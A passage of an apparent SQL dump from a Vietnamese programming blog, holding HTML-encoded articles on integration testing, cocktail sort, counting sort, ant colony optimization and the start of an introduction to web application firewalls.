tốn nhiều thời gian v&agrave; t&agrave;i nguy&ecirc;n để kiểm thử.</p>\r\n\r\n<p>Nguy cơ cao bỏ s&oacute;t lỗi.</p>\r\n\r\n<p><em>2. Phương ph&aacute;p Incremental:</em></p>\r\n\r\n<p><strong>M&ocirc; tả:</strong>&nbsp;Trong phương ph&aacute;p Incremental, c&aacute;c modules phần mềm được t&iacute;ch hợp v&agrave; kiểm thử theo từng nh&oacute;m nhỏ.</p>\r\n\r\n<p><strong>Ưu điểm:</strong></p>\r\n\r\n<p>Dễ d&agrave;ng x&aacute;c định nguồn gốc của lỗi.</p>\r\n\r\n<p>&Iacute;t tốn thời gian v&agrave; t&agrave;i nguy&ecirc;n hơn phương ph&aacute;p Big Bang.</p>\r\n\r\n<p>&Iacute;t nguy cơ bỏ s&oacute;t lỗi hơn.</p>\r\n\r\n<p><strong>Nhược điểm:</strong></p>\r\n\r\n<p>Phức tạp hơn phương ph&aacute;p Big Bang.</p>\r\n\r\n<p>C&oacute; thể kh&oacute; khăn trong việc đảm bảo t&iacute;nh tương th&iacute;ch giữa c&aacute;c nh&oacute;m module.</p>\r\n\r\n<p>Ngo&agrave;i hai phương ph&aacute;p tiếp cận ch&iacute;nh n&agrave;y, c&ograve;n c&oacute; một số chiến lược kh&aacute;c c&oacute; thể được sử dụng cho Integration Testing, bao gồm:</p>\r\n\r\n<p><em>Kiểm thử hướng tr&ecirc;n (Top-down testing):</em>Bắt đầu kiểm tra từ c&aacute;c module cấp cao nhất v&agrave; đi xuống c&aacute;c module con.</p>\r\n\r\n<p><em>Kiểm thử hướng dưới (Bottom-up testing):</em>&nbsp;Bắt đầu kiểm tra từ c&aacute;c module con v&agrave; đi l&ecirc;n c&aacute;c module cấp cao.</p>\r\n\r\n<p><em>Kiểm thử t&iacute;ch hợp lai (Hybrid integration testing):</em>&nbsp;Kết hợp cả kiểm thử hướng tr&ecirc;n v&agrave; hướng dưới.</p>\r\n\r\n<p><em>Kiểm thử t&iacute;ch hợp li&ecirc;n tục (Continuous integration):</em>&nbsp;Tự động h&oacute;a quy tr&igrave;nh kiểm thử t&iacute;ch hợp để n&oacute; được thực hiện thường xuy&ecirc;n, ngay sau khi c&oacute; bất kỳ thay đổi n&agrave;o được thực hiện đối với m&atilde; nguồn.</p>\r\n\r\n<p>Việc lựa chọn phương ph&aacute;p tiếp cận v&agrave; chiến lược Integration Testing ph&ugrave; hợp phụ thuộc v&agrave;o nhiều yếu tố, bao gồm k&iacute;ch thước v&agrave; độ phức tạp của dự &aacute;n, ng&acirc;n s&aacute;ch, thời gian v&agrave; nguồn lực c&oacute; sẵn, v.v.</p>\r\n\r\n<p><strong>Quy tr&igrave;nh thực hiện kiểm thử t&iacute;ch hợp</strong></p>\r\n\r\n<p>1. Chuẩn bị kế hoạch kiểm thử t&iacute;ch hợp.</p>\r\n\r\n<p>2. Thiết kế c&aacute;c test scenarios, test cases v&agrave; test scripts.</p>\r\n\r\n<p>3. Thực thi c&aacute;c test cases, b&aacute;o c&aacute;o c&aacute;c lỗi nếu c&oacute;.</p>\r\n\r\n<p>4. Theo d&otilde;i &amp; kiểm thử lại c&aacute;c test cases c&oacute; lỗi.</p>\r\n\r\n<p>Bước 3 v&agrave; 4 được lặp lại cho đến khi kiểm thử hợp được ho&agrave;n th&agrave;nh.</p>\r\n\r\n<p><strong>Ti&ecirc;u ch&iacute; bắt đầu v&agrave; kết th&uacute;c integration testing</strong></p>\r\n\r\n<p><em>Ti&ecirc;u ch&iacute; bắt đầu</em></p>\r\n\r\n<p>&middot; Th&agrave;nh phần / module đ&atilde; được kiểm thử đơn vị.</p>\r\n\r\n<p>&middot; Tất cả c&aacute;c lỗi c&oacute; độ ưu ti&ecirc;n cao đ&atilde; được sửa.</p>\r\n\r\n<p>&middot; Tất cả c&aacute;c module được ho&agrave;n th&agrave;nh v&agrave; được t&iacute;ch hợp.</p>\r\n\r\n<p>&middot; Kế hoạch kiểm thử t&iacute;ch hợp, test cases, c&aacute;c kịch bản, t&agrave;i liệu đ&atilde; được th&ocirc;ng qua.</p>\r\n\r\n<p>&middot; M&ocirc;i trường kiểm thử được thiết lập theo y&ecirc;u cầu để kiểm thử t&iacute;ch hợp.</p>\r\n\r\n<p><em>Ti&ecirc;u ch&iacute; kết th&uacute;c</em></p>\r\n\r\n<p>&middot; Kiểm thử t&iacute;ch hợp th&agrave;nh c&ocirc;ng.</p>\r\n\r\n<p>&middot; C&aacute;c trường hợp kiểm thử đ&atilde; thực thi được ghi lại</p>\r\n\r\n<p>&middot; Tất cả c&aacute;c lỗi c&oacute; ưu ti&ecirc;n cao đ&atilde; được sửa</p>\r\n\r\n<p>&middot; T&agrave;i liệu kỹ thuật được b&agrave;n giao.</p>', 'photo/F-F-T.jpg', 'admin', 0, '2024-06-29 06:25:21'),
(98, 'Thuật toán hay, bạn đã biết (Phần 3) - Cocktail Sort', 'dev ơi mình đi đâu thế?', '<p><strong>Cocktail Sort</strong>&nbsp;l&agrave; một biến thể của&nbsp;<strong>Bubble sort</strong>. Thuật to&aacute;n Bubble sort lu&ocirc;n duyệt qua c&aacute;c phần tử từ tr&aacute;i sang v&agrave; di chuyển phần tử lớn nhất v&agrave;o vị tr&iacute; đ&uacute;ng của n&oacute; trong v&ograve;ng lặp đầu ti&ecirc;n v&agrave; phần tử lớn thứ hai trong v&ograve;ng lặp thứ hai v&agrave; tiếp tục như vậy. Cocktail Sort duyệt qua một mảng đ&atilde; cho ở cả hai hướng xen kẽ. Cocktail sort kh&ocirc;ng đi qua c&aacute;c v&ograve;ng lặp kh&ocirc;ng cần thiết, l&agrave;m cho n&oacute; hiệu quả đối với c&aacute;c mảng lớn.</p>\r\n\r\n<p>Cocktail sort ph&aacute; vỡ c&aacute;c r&agrave;o cản hạn chế Bubble sort từ việc hiệu quả đủ lớn tr&ecirc;n c&aacute;c mảng lớn bằng c&aacute;ch kh&ocirc;ng cho ph&eacute;p ch&uacute;ng đi qua c&aacute;c v&ograve;ng lặp kh&ocirc;ng cần thiết tr&ecirc;n một khu vực cụ thể (hoặc cụm) trước khi di chuyển sang một phần kh&aacute;c của một mảng.</p>\r\n\r\n<p>THUẬT TO&Aacute;N:</p>\r\n\r\n<p>Mỗi v&ograve;ng lặp của thuật to&aacute;n được chia th&agrave;nh 2 giai đoạn:</p>\r\n\r\n<ol>\r\n	<li>\r\n	<p>Giai đoạn đầu ti&ecirc;n lặp qua mảng từ tr&aacute;i sang phải, tương tự như Bubble Sort. Trong qu&aacute; tr&igrave;nh lặp, c&aacute;c phần tử kế tiếp được so s&aacute;nh v&agrave; nếu gi&aacute; trị b&ecirc;n tr&aacute;i lớn hơn gi&aacute; trị b&ecirc;n phải, th&igrave; c&aacute;c gi&aacute; trị được ho&aacute;n đổi chỗ. Ở cuối v&ograve;ng lặp đầu ti&ecirc;n, số lớn nhất sẽ nằm ở cuối mảng.</p>\r\n	</li>\r\n	<li>\r\n	<p>Giai đoạn thứ hai lặp qua mảng theo hướng ngược lại - bắt đầu từ phần tử ngay trước phần tử mới được sắp xếp gần nhất v&agrave; di chuyển ngược lại đầu mảng. Ở đ&acirc;y cũng tương tự, c&aacute;c phần tử kế tiếp được so s&aacute;nh v&agrave; ho&aacute;n đổi nếu cần.</p>\r\n	</li>\r\n</ol>\r\n\r\n<p>V&Iacute; DỤ:</p>\r\n\r\n<p>Giả sử c&oacute; một mảng [5 1 4 2 8 0 2].</p>\r\n\r\n<p>LẦN LẶP QUA MẢNG VỚI HƯỚNG CHUYỂN TIẾP ĐẦU TI&Ecirc;N:</p>\r\n\r\n<ul>\r\n	<li>\r\n	<p>[<strong>5 1</strong>&nbsp;4 2 8 0 2] ? [<strong>1 5</strong>&nbsp;4 2 8 0 2], Ho&aacute;n đổi v&igrave; 5 &gt; 1</p>\r\n	</li>\r\n	<li>\r\n	<p>[1&nbsp;<strong>5 4</strong>&nbsp;2 8 0 2] ? [1&nbsp;<strong>4 5</strong>&nbsp;2 8 0 2], Ho&aacute;n đổi v&igrave; 5 &gt; 4</p>\r\n	</li>\r\n	<li>\r\n	<p>[1 4&nbsp;<strong>5 2</strong>&nbsp;8 0 2] ? [1 4 2 5 8 0 2], Ho&aacute;n đổi v&igrave; 5 &gt; 2</p>\r\n	</li>\r\n	<li>\r\n	<p>[1 4 2&nbsp;<strong>5 8</strong>&nbsp;0 2] ? [1 4 2&nbsp;<strong>5 8</strong>&nbsp;0 2]</p>\r\n	</li>\r\n	<li>\r\n	<p>[1 4 2 5&nbsp;<strong>8 0</strong>&nbsp;2] ? [1 4 2 5&nbsp;<strong>0 8</strong>&nbsp;2], Ho&aacute;n đổi v&igrave; 8 &gt; 0</p>\r\n	</li>\r\n	<li>\r\n	<p>[1 4 2 5 0&nbsp;<strong>8 2</strong>] ? [1 4 2 5 0&nbsp;<strong>2 8</strong>], Ho&aacute;n đổi v&igrave; 8 &gt; 2</p>\r\n	</li>\r\n</ul>\r\n\r\n<p>LẦN LẶP QUA MẢNG VỚI HƯỚNG L&Ugrave;I ĐẦU TI&Ecirc;N:</p>\r\n\r\n<ul>\r\n	<li>\r\n	<p>[1 4 2 5&nbsp;<strong>0 2</strong>&nbsp;8] ? [1 4 2 5&nbsp;<strong>0 2</strong>&nbsp;8]</p>\r\n	</li>\r\n	<li>\r\n	<p>[1 4 2&nbsp;<strong>5 0</strong>&nbsp;2 8] ? [1 4 2&nbsp;<strong>0 5</strong>&nbsp;2 8], Ho&aacute;n đổi v&igrave; 5 &gt; 0</p>\r\n	</li>\r\n	<li>\r\n	<p>[1 4&nbsp;<strong>2 0</strong>&nbsp;5 2 8] ? [1 4&nbsp;<strong>0 2</strong>&nbsp;5 2 8], Ho&aacute;n đổi v&igrave; 2 &gt; 0</p>\r\n	</li>\r\n	<li>\r\n	<p>[1&nbsp;<strong>4 0</strong>&nbsp;2 5 2 8] ? [1&nbsp;<strong>0 4</strong>&nbsp;2 5 2 8], Ho&aacute;n đổi v&igrave; 4 &gt; 0</p>\r\n	</li>\r\n	<li>\r\n	<p>[<strong>1 0</strong>&nbsp;4 2 5 2 8] ? [<strong>0 1</strong>&nbsp;4 2 5 2 8], Ho&aacute;n đổi v&igrave; 1 &gt; 0</p>\r\n	</li>\r\n</ul>\r\n\r\n<p>LẦN LẶP QUA MẢNG VỚI HƯỚNG CHUYỂN TIẾP THỨ HAI:</p>\r\n\r\n<ul>\r\n	<li>\r\n	<p>[0&nbsp;<strong>1 4</strong>&nbsp;2 5 2 8] ? [0&nbsp;<strong>1 4</strong>&nbsp;2 5 2 8]</p>\r\n	</li>\r\n	<li>\r\n	<p>[0 1&nbsp;<strong>4 2</strong>&nbsp;5 2 8] ? [0 1&nbsp;<strong>2 4</strong>&nbsp;5 2 8], Ho&aacute;n đổi v&igrave; 4 &gt; 2</p>\r\n	</li>\r\n	<li>\r\n	<p>[0 1 2&nbsp;<strong>4 5</strong>&nbsp;2 8] ? [0 1 2&nbsp;<strong>4 5</strong>&nbsp;2 8]</p>\r\n	</li>\r\n	<li>\r\n	<p>[0 1 2 4&nbsp;<strong>5 2</strong>&nbsp;8] ? [0 1 2 4&nbsp;<strong>2 5</strong>&nbsp;8], Ho&aacute;n đổi v&igrave; 5 &gt; 2</p>\r\n	</li>\r\n</ul>\r\n\r\n<p>LẦN LẶP QUA MẢNG VỚI HƯỚNG L&Ugrave;I THỨ HAI:</p>\r\n\r\n<ul>\r\n	<li>\r\n	<p>[0 1 2&nbsp;<strong>4 2</strong>&nbsp;5 8] ? [0 1 2<strong>&nbsp;2 4</strong>&nbsp;5 8], Ho&aacute;n đổi v&igrave; 4 &gt; 2</p>\r\n	</li>\r\n</ul>\r\n\r\n<p><br />\r\nM&igrave;nh k&egrave;m th&ecirc;m đoạn code c&agrave;i đặt thuật to&aacute;n b&ecirc;n dưới. Hy vọng b&agrave;i viết sẽ cung cấp th&ecirc;m cho c&aacute;c bạn một kiến thức mới về thuật to&aacute;n.</p>', 'photo/1_yER1q2JEsy4Lfq2XB5KqdA.jpeg', 'admin', 0, '2024-06-29 06:25:21'),
(99, 'Thuật toán hay, bạn đã biết? (Phần 2) - Tìm hiểu về Counting Sort.', 'dev ơi mình đi đâu thế?', '<p><br />\r\nHế nh&ocirc; mọi người, h&ocirc;m nay m&igrave;nh sẽ c&ugrave;ng t&igrave;m hiểu một thuật to&aacute;n Sort kh&aacute; l&agrave; th&uacute; vị nh&eacute;. Counting Sort l&agrave; một thuật to&aacute;n sắp xếp đơn giản v&agrave; hiệu quả, được sử dụng đặc biệt khi d&atilde;y số đầu v&agrave;o c&oacute; giới hạn về khoảng gi&aacute; trị v&agrave; kh&ocirc;ng qu&aacute; lớn. Thuật to&aacute;n n&agrave;y kh&ocirc;ng sử dụng so s&aacute;nh giữa c&aacute;c phần tử m&agrave; dựa v&agrave;o việc đếm số lần xuất hiện của từng gi&aacute; trị để sắp xếp ch&uacute;ng.</p>\r\n\r\n<p><strong>C&aacute;ch hoạt động của Counting Sort:</strong></p>\r\n\r\n<ol>\r\n	<li>\r\n	<p>Khai b&aacute;o một mảng phụ countArray[] c&oacute; k&iacute;ch thước max(inputArray[]) + 1 v&agrave; khởi tạo tất cả c&aacute;c phần tử của n&oacute; bằng 0.</p>\r\n	</li>\r\n	<li>\r\n	<p>Duyệt qua mảng inputArray[] v&agrave; &aacute;nh xạ mỗi phần tử của inputArray[] như một chỉ mục của mảng countArray[], tức l&agrave; thực hiện countArray[inputArray[i]]++ cho 0 &lt;= i &lt; N.</p>\r\n	</li>\r\n	<li>\r\n	<p>T&iacute;nh tổng tiền tố tại mỗi chỉ mục của mảng inputArray[].</p>\r\n	</li>\r\n	<li>\r\n	<p>Tạo một mảng outputArray[] c&oacute; k&iacute;ch thước N.</p>\r\n	</li>\r\n	<li>\r\n	<p>Duyệt qua mảng inputArray[] từ cuối về đầu v&agrave; cập nhật outputArray[ countArray[ inputArray[i] ] &ndash; 1] = inputArray[i]. Đồng thời cập nhật countArray[ inputArray[i] ] = countArray[ inputArray[i] ] &ndash; 1.</p>\r\n	</li>\r\n</ol>\r\n\r\n<p>ƯU ĐIỂM:</p>\r\n\r\n<ul>\r\n	<li>\r\n	<p><strong>Hiệu suất cao:</strong>&nbsp;Counting Sort hoạt động trong thời gian tuyến t&iacute;nh, với độ phức tạp O(n+k), trong đ&oacute; n l&agrave; số lượng phần tử của mảng v&agrave; k l&agrave; phạm vi của c&aacute;c gi&aacute; trị trong mảng.</p>\r\n	</li>\r\n	<li>\r\n	<p><strong>Kh&ocirc;ng y&ecirc;u cầu so s&aacute;nh:</strong>&nbsp;Kh&ocirc;ng cần thực hiện bất kỳ ph&eacute;p so s&aacute;nh n&agrave;o giữa c&aacute;c phần tử, l&agrave;m cho thuật to&aacute;n n&agrave;y trở n&ecirc;n nhanh ch&oacute;ng đối với c&aacute;c tập dữ liệu lớn.</p>\r\n	</li>\r\n</ul>\r\n\r\n<p>NHƯỢC ĐIỂM:</p>\r\n\r\n<ul>\r\n	<li>\r\n	<p><strong>Kh&ocirc;ng hiệu quả khi phạm vi lớn:</strong>&nbsp;Nếu phạm vi của c&aacute;c gi&aacute; trị trong mảng qu&aacute; lớn so với số lượng phần tử, việc cấp ph&aacute;t bộ nhớ cho mảng đếm c&oacute; thể trở th&agrave;nh vấn đề.</p>\r\n	</li>\r\n	<li>\r\n	<p><strong>Kh&ocirc;ng ổn định:</strong>&nbsp;Nếu c&aacute;c phần tử c&oacute; c&ugrave;ng gi&aacute; trị, thứ tự ban đầu của ch&uacute;ng c&oacute; thể kh&ocirc;ng được bảo to&agrave;n trong mảng kết quả.</p>\r\n	</li>\r\n</ul>\r\n\r\n<p>Counting Sort l&agrave; một lựa chọn tốt khi l&agrave;m việc với c&aacute;c tập dữ liệu c&oacute; phạm vi gi&aacute; trị nhỏ. Tuy nhi&ecirc;n, cần lưu &yacute; rằng n&oacute; kh&ocirc;ng ph&ugrave; hợp cho mọi trường hợp v&agrave; cần xem x&eacute;t kỹ lưỡng trước khi &aacute;p dụng v&agrave;o thực tế.</p>', 'photo/1_-sGG-7EvvTzOBSkhSqe8RQ-1.png', 'admin', 0, '2024-06-29 06:25:21'),
(100, 'ANT COLONY OPTIMIZATION – CÁCH MÀ ĐÀN KIẾN CHO CHÚNG TA NHỮNG GIẢI PHÁP TỐI ƯU', 'dev ơi mình đi đâu thế?', '<p>Thuật to&aacute;n ACO, m&ocirc; phỏng h&agrave;nh vi t&igrave;m kiếm của đ&agrave;n kiến khi t&igrave;m thức ăn, cốt l&otilde;i của thuật to&aacute;n đ&oacute; l&agrave; c&aacute;ch m&agrave; những con kiến đi trước truyền đạt lại &ldquo;kinh nghiệm&rdquo; của m&igrave;nh cho những con kiến đi sau, từ đ&oacute; đường đi kiếm thức ăn l&uacute;c sau sẽ được tối ưu hơn</p>\r\n\r\n<p>Để cho r&otilde; hơn th&igrave; ta sẽ &aacute;p dụng ACO để giải quyết b&agrave;i to&aacute;n kinh điển TSP (t&igrave;m đường đi ngắn nhất qua c&aacute;c th&agrave;nh phố v&agrave; quay lại điểm xuất ph&aacute;t)</p>\r\n\r\n<p>Đầu ti&ecirc;n ta sẽ tạo ra một &ldquo;đội qu&acirc;n&rdquo; kiến để đi t&igrave;m kiếm</p>\r\n\r\n<p>Kế tiếp mỗi con kiến sẽ đi từ th&agrave;nh phố xuất ph&aacute;t đến c&aacute;c th&agrave;nh phố kế tiếp</p>\r\n\r\n<p>Những con kiến sau đ&oacute; sẽ dựa v&agrave;o lượng pheromone v&agrave; khả năng heuristic (c&aacute;c bạn cứ coi như đ&acirc;y l&agrave; kinh nghiệm xương m&aacute;u của mấy con kiến trước để lại l&agrave; được)</p>\r\n\r\n<p>V&agrave; v&ograve;ng lặp cứ thế lặp lại cho đến khi t&igrave;m được đường đi tối ưu nhất</p>', 'photo/1_dc_xYmmBtTPbBwvGAkaXtA.jpeg', 'admin', 0, '2024-06-29 06:25:21'),
(101, 'Kiểm thử tích hợp - Integration testing', 'dev ơi mình đi đâu thế?', '<p>Kiểm thử t&iacute;ch hợp (Integration Testing) tập trung v&agrave;o kiểm tra giao tiếp dữ liệu giữa c&aacute;c m&ocirc;-đun. Do đ&oacute;, n&oacute; cũng được gọi l&agrave; &ldquo;I&amp;T&rdquo; (T&iacute;ch hợp v&agrave; Kiểm tra), &ldquo;Kiểm tra chuỗi&rsquo; v&agrave; đ&ocirc;i khi l&agrave; &ldquo;Kiểm tra luồng&rdquo;.</p>\r\n\r\n<p><strong>Integration test</strong></p>\r\n\r\n<p>Một dự &aacute;n phần mềm điển h&igrave;nh bao gồm nhiều modules phần mềm, được ph&aacute;t triển bởi c&aacute;c lập tr&igrave;nh vi&ecirc;n kh&aacute;c nhau. Kiểm thử t&iacute;ch hợp l&agrave; một loại kiểm thử trong đ&oacute; c&aacute;c modules của phần mềm được t&iacute;ch hợp logic v&agrave; được kiểm thử theo nh&oacute;m. Mục đ&iacute;ch của cấp độ kiểm tra n&agrave;y l&agrave; để lộ ra c&aacute;c khiếm khuyết (lỗi) trong tương t&aacute;c giữa c&aacute;c modules phần mềm khi ch&uacute;ng được t&iacute;ch hợp với nhau.</p>\r\n\r\n<p>V&iacute; dụ c&ocirc;ng ty bạn nhận được y&ecirc;u cầu ph&aacute;t triển trang web mua sắm trực tuyến. Sau khi thu thập y&ecirc;u cầu, ph&acirc;n t&iacute;ch v&agrave; thiết kế ho&agrave;n tất, một nh&agrave; ph&aacute;t triển đ&atilde; được chỉ định để ph&aacute;t triển từng module b&ecirc;n dưới.</p>\r\n\r\n<p>&middot; Đăng k&yacute; v&agrave; x&aacute;c thực người d&ugrave;ng / Đăng nhập</p>\r\n\r\n<p>&middot; Danh mục sản phẩm</p>\r\n\r\n<p>&middot; Giỏ h&agrave;ng</p>\r\n\r\n<p>&middot; Thanh to&aacute;n</p>\r\n\r\n<p>&middot; T&iacute;ch hợp cổng thanh to&aacute;n</p>\r\n\r\n<p>&middot; Theo d&otilde;i vận chuyển v&agrave; g&oacute;i h&agrave;ng</p>\r\n\r\n<p>Sau khi c&aacute;c dev ph&aacute;t triển v&agrave; thực hiện unit test th&igrave; họ tiến h&agrave;nh kết hợp c&aacute;c modules lại với nhau, l&uacute;c n&agrave;y ch&uacute;ng ta cần thực hiện kiểm thử để x&aacute;c nhận rằng tất cả c&aacute;c m&ocirc;-đun c&oacute; thể hoạt động c&ugrave;ng nhau. Khi triển khai tất cả m&atilde; của họ trong một m&aacute;y chung, họ thấy rằng ứng dụng kh&ocirc;ng hoạt động như mong đợi v&igrave; c&aacute;c modules ri&ecirc;ng lẻ kh&ocirc;ng hoạt động tốt với nhau. C&oacute; một số lỗi như - sau khi đăng nhập, giỏ h&agrave;ng của người d&ugrave;ng kh&ocirc;ng hiển thị c&aacute;c mục họ đ&atilde; th&ecirc;m trước đ&oacute;, số tiền h&oacute;a đơn kh&ocirc;ng bao gồm chi ph&iacute; vận chuyển, v.v.</p>\r\n\r\n<p>Như vậy, kiểm thử t&iacute;ch hợp gi&uacute;p ch&uacute;ng ta x&aacute;c định, khắc phục c&aacute;c sự cố v&agrave; đảm bảo rằng to&agrave;n bộ ứng dụng hoạt động như mong đợi.</p>\r\n\r\n<p><strong>Phương ph&aacute;p tiếp cận Integration test</strong></p>\r\n\r\n<p><em>1. Phương ph&aacute;p Big Bang</em>:</p>\r\n\r\n<p><strong>M&ocirc; tả:</strong>&nbsp;Trong phương ph&aacute;p Big Bang, tất cả c&aacute;c modules phần mềm được t&iacute;ch hợp c&ugrave;ng một l&uacute;c v&agrave; sau đ&oacute; được kiểm thử như một hệ thống ho&agrave;n chỉnh.</p>\r\n\r\n<p><strong>Ưu điểm</strong>:</p>\r\n\r\n<p>Đơn giản v&agrave; dễ thực hiện.</p>\r\n\r\n<p>C&oacute; thể ph&aacute;t hiện c&aacute;c lỗi hệ thống phức tạp.</p>\r\n\r\n<p><strong>Nhược điểm:</strong></p>\r\n\r\n<p>Kh&oacute; khăn trong việc x&aacute;c định nguồn gốc của lỗi.</p>\r\n\r\n<p>C&oacute; thể tốn nhiều thời gian v&agrave; t&agrave;i nguy&ecirc;n để kiểm thử.</p>\r\n\r\n<p>Nguy cơ cao bỏ s&oacute;t lỗi.</p>\r\n\r\n<p><em>2. Phương ph&aacute;p Incremental:</em></p>\r\n\r\n<p><strong>M&ocirc; tả:</strong>&nbsp;Trong phương ph&aacute;p Incremental, c&aacute;c modules phần mềm được t&iacute;ch hợp v&agrave; kiểm thử theo từng nh&oacute;m nhỏ.</p>\r\n\r\n<p><strong>Ưu điểm:</strong></p>\r\n\r\n<p>Dễ d&agrave;ng x&aacute;c định nguồn gốc của lỗi.</p>\r\n\r\n<p>&Iacute;t tốn thời gian v&agrave; t&agrave;i nguy&ecirc;n hơn phương ph&aacute;p Big Bang.</p>\r\n\r\n<p>&Iacute;t nguy cơ bỏ s&oacute;t lỗi hơn.</p>\r\n\r\n<p><strong>Nhược điểm:</strong></p>\r\n\r\n<p>Phức tạp hơn phương ph&aacute;p Big Bang.</p>\r\n\r\n<p>C&oacute; thể kh&oacute; khăn trong việc đảm bảo t&iacute;nh tương th&iacute;ch giữa c&aacute;c nh&oacute;m module.</p>\r\n\r\n<p>Ngo&agrave;i hai phương ph&aacute;p tiếp cận ch&iacute;nh n&agrave;y, c&ograve;n c&oacute; một số chiến lược kh&aacute;c c&oacute; thể được sử dụng cho Integration Testing, bao gồm:</p>\r\n\r\n<p><em>Kiểm thử hướng tr&ecirc;n (Top-down testing):</em>Bắt đầu kiểm tra từ c&aacute;c module cấp cao nhất v&agrave; đi xuống c&aacute;c module con.</p>\r\n\r\n<p><em>Kiểm thử hướng dưới (Bottom-up testing):</em>&nbsp;Bắt đầu kiểm tra từ c&aacute;c module con v&agrave; đi l&ecirc;n c&aacute;c module cấp cao.</p>\r\n\r\n<p><em>Kiểm thử t&iacute;ch hợp lai (Hybrid integration testing):</em>&nbsp;Kết hợp cả kiểm thử hướng tr&ecirc;n v&agrave; hướng dưới.</p>\r\n\r\n<p><em>Kiểm thử t&iacute;ch hợp li&ecirc;n tục (Continuous integration):</em>&nbsp;Tự động h&oacute;a quy tr&igrave;nh kiểm thử t&iacute;ch hợp để n&oacute; được thực hiện thường xuy&ecirc;n, ngay sau khi c&oacute; bất kỳ thay đổi n&agrave;o được thực hiện đối với m&atilde; nguồn.</p>\r\n\r\n<p>Việc lựa chọn phương ph&aacute;p tiếp cận v&agrave; chiến lược Integration Testing ph&ugrave; hợp phụ thuộc v&agrave;o nhiều yếu tố, bao gồm k&iacute;ch thước v&agrave; độ phức tạp của dự &aacute;n, ng&acirc;n s&aacute;ch, thời gian v&agrave; nguồn lực c&oacute; sẵn, v.v.</p>\r\n\r\n<p><strong>Quy tr&igrave;nh thực hiện kiểm thử t&iacute;ch hợp</strong></p>\r\n\r\n<p>1. Chuẩn bị kế hoạch kiểm thử t&iacute;ch hợp.</p>\r\n\r\n<p>2. Thiết kế c&aacute;c test scenarios, test cases v&agrave; test scripts.</p>\r\n\r\n<p>3. Thực thi c&aacute;c test cases, b&aacute;o c&aacute;o c&aacute;c lỗi nếu c&oacute;.</p>\r\n\r\n<p>4. Theo d&otilde;i &amp; kiểm thử lại c&aacute;c test cases c&oacute; lỗi.</p>\r\n\r\n<p>Bước 3 v&agrave; 4 được lặp lại cho đến khi kiểm thử hợp được ho&agrave;n th&agrave;nh.</p>\r\n\r\n<p><strong>Ti&ecirc;u ch&iacute; bắt đầu v&agrave; kết th&uacute;c integration testing</strong></p>\r\n\r\n<p><em>Ti&ecirc;u ch&iacute; bắt đầu</em></p>\r\n\r\n<p>&middot; Th&agrave;nh phần / module đ&atilde; được kiểm thử đơn vị.</p>\r\n\r\n<p>&middot; Tất cả c&aacute;c lỗi c&oacute; độ ưu ti&ecirc;n cao đ&atilde; được sửa.</p>\r\n\r\n<p>&middot; Tất cả c&aacute;c module được ho&agrave;n th&agrave;nh v&agrave; được t&iacute;ch hợp.</p>\r\n\r\n<p>&middot; Kế hoạch kiểm thử t&iacute;ch hợp, test cases, c&aacute;c kịch bản, t&agrave;i liệu đ&atilde; được th&ocirc;ng qua.</p>\r\n\r\n<p>&middot; M&ocirc;i trường kiểm thử được thiết lập theo y&ecirc;u cầu để kiểm thử t&iacute;ch hợp.</p>\r\n\r\n<p><em>Ti&ecirc;u ch&iacute; kết th&uacute;c</em></p>\r\n\r\n<p>&middot; Kiểm thử t&iacute;ch hợp th&agrave;nh c&ocirc;ng.</p>\r\n\r\n<p>&middot; C&aacute;c trường hợp kiểm thử đ&atilde; thực thi được ghi lại</p>\r\n\r\n<p>&middot; Tất cả c&aacute;c lỗi c&oacute; ưu ti&ecirc;n cao đ&atilde; được sửa</p>\r\n\r\n<p>&middot; T&agrave;i liệu kỹ thuật được b&agrave;n giao.</p>', 'photo/1489939936Dientap.png', 'admin', 0, '2024-06-29 06:25:21'),
(102, 'WAF – Bức tường phòng thủ của Web', 'dev ơi mình đi đâu thế?', '<p><strong>WAF l&agrave; g&igrave;?</strong></p>\r\n\r\n<p>WAF &ndash; Web Application Firewall l&agrave; tưởng lửa của ứng dụng web gi&uacute;p bảo vệ ứng dụng web bằng c&aacute;ch lọc v&agrave; gi&aacute;m s&aacute;t lưu lượng HTTP. N&oacute; thường bảo vệ c&aacute;c ứng dụng web khỏi c&aacute;c cuộc tấn c&ocirc;ng như CSRF (cross-site request forgery), XSS (cross-site scripting), SQL Injection, c&ugrave;ng nhiều cuộc tấn c&ocirc;ng kh&aacute;c.</p>\r\n\r\n<p><strong>C&aacute;ch thức hoạt động của WAF</strong></p>\r\n\r\n<p>WAF l&agrave; lớp bảo vệ giao thức ở lớp thứ 7 (trong m&ocirc; h&igrave;nh OSI) v&agrave; kh&ocirc;ng được thiết kế để chống lại tất cả c&aacute;c loại tấn c&ocirc;ng nhưng c&oacute; thể kết hợp với c&aacute;c c&ocirc;ng cụ kh&aacute;c tạo n&ecirc;n lớp ph&ograve;ng thủ to&agrave;n diện. Bằng c&aacute;ch triển khai WAF trước ứng dụng web, một tấm chắn sẽ được đặt giữa ứng dụng web v&agrave; Internet. Trong khi m&aacute;y chủ proxy bảo vệ danh t&iacute;nh của m&aacute;y kh&aacute;ch bằng c&aacute;ch sử dụng một trung gian th&igrave; WAF l&agrave; một loại proxy ngược, bảo vệ m&aacute;y chủ khỏi bị lộ bằng c&aacute;ch y&ecirc;u cầu m&aacute;y kh&aacute;ch đi qua WAF trước khi đến m&aacute;y chủ.</p>\r\n\r\n<p><strong>Lợi &iacute;ch của WAF</strong></p>\r\n\r\n<ul>\r\n	<li>\r\n	<p><strong>Bảo mật to&agrave;n diện:&nbsp;</strong>WAF c&oacute; thể kiểm tra v&agrave; loại bỏ c&aacute;c yếu tố nguy hiểm từ c&aacute;c y&ecirc;u cầu web đầu v&agrave;o. Điều n&agrave;y gi&uacute;p ngăn chặn c&aacute;c lỗ hổng bảo mật tiềm ẩn trong m&atilde; nguồn của ứng dụng web.</p>\r\n	</li>\r\n	<li>\r\n	<p><strong>Tiết kiệm chi ph&iacute;:</strong>&nbsp;WAF kh&ocirc;ng y&ecirc;u cầu phần cứng, phần mềm, chi ph&iacute; vận h&agrave;nh v&agrave; bảo tr&igrave;, cũng như kh&ocirc;ng cần kỹ sư WAF in-house ở ph&iacute;a kh&aacute;ch h&agrave;ng.</p>\r\n	</li>\r\n	<li>\r\n	<p><strong>Tối ưu hiệu suất ứng dụng:&nbsp;</strong>Bằng c&aacute;ch loại bỏ c&aacute;c mối đe dọa từ y&ecirc;u cầu web trước khi ch&uacute;ng đến tới ứng dụng, WAF c&oacute; thể gi&uacute;p tối ưu h&oacute;a hiệu suất của ứng dụng bằng c&aacute;ch giảm tải cho m&aacute;y chủ v&agrave; 